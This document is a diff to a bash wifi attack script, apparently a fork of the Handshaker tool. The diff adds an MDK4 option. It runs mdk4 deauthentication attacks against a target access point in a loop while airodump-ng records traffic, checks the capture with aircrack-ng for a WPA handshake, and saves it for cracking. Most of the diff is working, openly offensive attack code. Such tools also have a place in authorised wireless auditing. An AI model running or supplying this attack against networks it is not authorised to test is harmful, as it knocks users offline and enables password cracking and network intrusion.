@@ -226,6 +226,17 @@ if [ ! -e /proc/$mdk3pid ]; then
 sleep 2
 fi
 }
+################################################ Mdk4 ##############################################################
+MDK4(){
+echo "$bssid" >redes/mdk4.txt
+ 
+xterm -fg red -bg black -e mdk4 $intmon d -b redes/mdk4.txt -c $CANAL& 
+mdk4pid=$! 
+sleep 10 && kill $mdk4pid &>/dev/null 
+if [ ! -e /proc/$mdk4pid ]; then
+sleep 2
+fi
+}
 #############################################SELECT################################################################
 ## Esta funcción fue redacta el 19 junio de 2015 por kcdtv para www.wifi-libre.com para reemplzar la de coeman76
 ## La fucción original de Handshaker by Coeman76 ha quedado obsoleta debido a un cambio mayor en aircrack.ng a partir de la versión 1.2rc2
@@ -669,6 +680,90 @@ break
 fi
 done
 }
+#############################################  MDK4 ##################################################
+HANDSHAKE4(){
+intervalo=20
+hay=""
+airsnif=`ps -A | grep airodump-ng | grep -v grep`
+while [ ! "$airsnif" = "" ]; do
+CALCULANUM
+varios=`cat redes/"$essid"_"$bssidseparado"-01.csv | grep -v WPA | grep $bssid | awk -F ',' '{print $1}'| awk '{gsub(/ /,""); print}'` 
+cuantoshay=`echo $varios | wc -w`
+if [ "$varios" = "" ]; then
+CALCULANUM
+echo -e $azul"\r${TAB} Looking for clients...\c"
+CONT=1
+while [ $CONT -le 25 ]; do
+echo -e " \c"
+sleep 0.05
+CONT=$((CONT+1))
+done
+else
+CONT=1
+while [ $CONT -le $cuantoshay ]; do
+hay=`echo $varios | awk '{print $'$CONT'}'`
+clientemac=`echo -n $hay | cut -c-8`
+echo -en $verde"\r Launching MDK4 attack on "$azul"$essid... \033[K""$verde"
+echo ""
+sleep 1
+MDK4
+CONT=$((CONT+1))
+done
+CONT=$intervalo
+while [ $CONT -ge 1 ]; do
+CALCULANUM
+datas=`cat ./redes/"$essid"_"$bssidseparado"-01.csv | grep "WPA" | awk '{print $11}' FS=',' | awk '{gsub(/ /,""); print}'`
+if [[ $datas -ne 0 ]]; then
+hands=`aircrack-ng redes/"$essid"_"$bssidseparado"-01.cap | grep $bssid | tail --bytes 14`
+fi
+if [ $CONT -eq 1 ]; then
+echo -e $azul"\r${TAB} Restarting attack on  "$verde"$CONT...   $amarillo  $hands \c"$verde
+else
+if [ $CONT -lt 10 ]; then
+echo -e $azul"\r${TAB} Restarting attack on  "$verde"$CONT...   $amarillo  $hands \c"$verde
+else
+echo -e $azul"\r${TAB} Restarting attack on  "$verde"$CONT...   $amarillo  $hands \c"$verde
+fi
+fi
+if [ "$hands" = "(1 handshake)" ]; then
+echo -e $amarillo
+break
+fi
+sleep 1
+CONT=$((CONT-1))
+done
+fi
+CALCULANUM
+datas=`cat ./redes/"$essid"_"$bssidseparado"-01.csv | grep "WPA" | awk '{print $11}' FS=',' | awk '{gsub(/ /,""); print}'`
+if [[ $datas -ne 0 ]]; then
+hands=`aircrack-ng redes/"$essid"_"$bssidseparado"-01.cap | grep $bssid | tail --bytes 14`
+fi
+if [ "$hands" = "(1 handshake)" ]; then
+clear
+echo ""
+echo ""
+echo -e $magenta "══════════════════════════════════════════════════"
+echo -e $blanco"         ¡¡¡ "$verde"HANDSHAKE ACHIEVED"$blanco" !!!"
+echo -e $magenta "══════════════════════════════════════════════════"
+#wpaclean "/root/Desktop/$essid"_"$bssidseparado.cap" "redes/$essid"_"$bssidseparado-01.cap" > /dev/null 2>&1
+#ADD HIDDEN
+Hidden=`cat ./redes/"$essid"_"$bssidseparado"-01.csv | grep $bssid | cut -d',' -f14 | sed '1s/^.//'`
+mv -f "redes/$essid"_"$bssidseparado-01.cap" "handshake/$Hidden"_"$bssidseparado.cap" > /dev/null 2>&1
+KILL
+ruta_handshake=`cd ./handshake ; readlink -f "$essid"_"$bssidseparado.cap"`
+echo ""
+echo ""
+echo -e $amarillo " The Handshake is in the handshake folder  ;) "
+echo ""
+echo -e " The handshake path is "$verde"$ruta_handshake"
+sleep 1
+echo "" 
+echo -e $azul " END..."
+echo ""
+break
+fi
+done
+}
 ####################################### Handshake Honeypot ###########################################################
 HANDSHAKE3(){
 intervalo2=300
@@ -804,6 +899,8 @@ echo
 echo " 4) Honeypot + Aireplay-ng"
 echo
 echo " 5) Honeypot + MDK3"
+echo
+echo -e $rojo" 6) MDK4"
 echo ""
 echo -e $amarillo""
 read -p " Choose an option : " OPC
@@ -847,6 +944,15 @@ echo ""
 DETECTMDK3
 HONEYPOT
 ATAQUEHONEYPOT1
+elif [ "$OPC" = 6 ]; then
+echo ""
+echo -e $amarillo " You have chosen : "$azul"ATTACK WITH MDK4"
+echo -e $magenta "══════════════════════════════════════════════════"
+echo ""
+echo -e $verde" Capturing Data and Waiting for Handshake...."
+SNIFF &
+CSV
+HANDSHAKE4
 fi
 ################################################## Fin #############################################################
 exit 0 ### añadido para salir limpiamente mod junio 2015 by kcdtv
